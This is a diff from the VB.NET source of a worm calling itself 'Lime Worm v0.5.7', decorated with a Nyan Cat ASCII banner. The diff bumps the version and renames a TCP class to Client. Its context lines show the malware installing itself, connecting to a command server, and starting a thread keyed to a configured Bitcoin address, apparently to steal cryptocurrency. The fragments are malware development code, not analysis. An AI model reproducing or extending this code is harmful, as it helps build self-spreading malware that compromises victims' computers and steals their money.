@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on May./04/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./05/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.6 ..                   ##
+'##                     .. Lime Worm v0.5.7 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -37,7 +37,7 @@
 Imports System.Threading
 
 Public Class Main
-    Public Shared C As New TCP
+    Public Shared C As New Client
     Public Shared SPL = "|'L'|"
 
     Public Shared Sub Main()
@@ -59,7 +59,7 @@ Public Class Main
 
         Call Installation.INS()
 
-        TCP.T1.Start() 'Start TCP connection to server
+        Client.T1.Start() 'Start TCP connection to server
 
         If Settings.BTC_ADDR.Length > 25 Then
             Dim _BTC As Thread = New Thread(AddressOf _BTC_ST)
